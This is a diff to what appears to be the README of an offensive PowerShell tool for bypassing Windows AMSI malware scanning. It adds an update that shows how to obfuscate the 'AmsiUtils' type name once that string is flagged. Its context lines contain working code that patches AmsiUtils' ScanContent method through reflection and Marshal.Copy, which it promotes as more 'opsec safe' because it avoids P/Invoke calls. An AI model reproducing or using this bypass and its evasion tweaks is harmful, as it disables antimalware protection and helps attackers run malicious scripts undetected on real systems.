@@ -22,6 +22,11 @@ Matt Graeber first introduced the technique to bypass AMSI by using reflection i
 ! UPDATE 05/06/2024 
 ! Refer to TrollAMSIdotnet for amsi bypass for Assembly.Load()
 ```
+```diff
+! UPDATE 11/11/2024 
+!  "System.Management.Automation.AmsiUtils" is being flagged now, just do a basic obfuscation of it, like the example below and it works again 
+! $o = [Ref].Assembly.GetType([System.String]::Join("", "S", "y", "s", "t", "e", "m", ".", "M", "a", "n", "a", "g", "e", "m", "e", "n", "t", ".", "A", "u", "t", "o", "m", "a", "t", "i", "o", "n", ".", "A", "m", "s", "i", "U", "t", "i", "l", "s")
+```
 
 ## Benefits
 - No P/Invoke or win32 API calls used such as VirtualProtect hence **WAAAAAY more opsec safe**
@@ -34,8 +39,6 @@ Matt Graeber first introduced the technique to bypass AMSI by using reflection i
 class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
 $o = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent
 $t = [TrollAMSI].GetMethods() | Where-Object Name -eq 'M'
-#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($t.MethodHandle)  
-#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($o.MethodHandle)
 [System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$t.MethodHandle.Value + [long]8)),0, [long]$o.MethodHandle.Value + [long]8,1)
 ```
 ### Raw Powershell One-Liner
